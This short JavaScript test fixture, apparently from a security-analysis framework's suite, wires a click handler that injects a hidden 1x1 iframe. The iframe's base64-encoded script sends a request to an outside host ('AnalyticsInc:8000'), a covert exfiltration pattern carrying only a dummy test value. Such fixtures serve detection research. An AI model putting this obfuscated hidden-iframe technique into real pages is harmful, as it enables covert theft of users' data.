// exfil_test_data5.js
function exfiltrate_key_history() {
  var data$$18 = "PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD1kYXRhNSIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=";
  var URL = "data:text/html;charset=utf-8;base64," + data$$18;
  var script = document.createElement("iframe");
  script.src = URL;
  script.style.width = "1px";
  script.style.height = "1px";
  var v2 = document.getElementsByTagName("body")[0];
  JAM.call(v2.appendChild, v2, [script]);
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
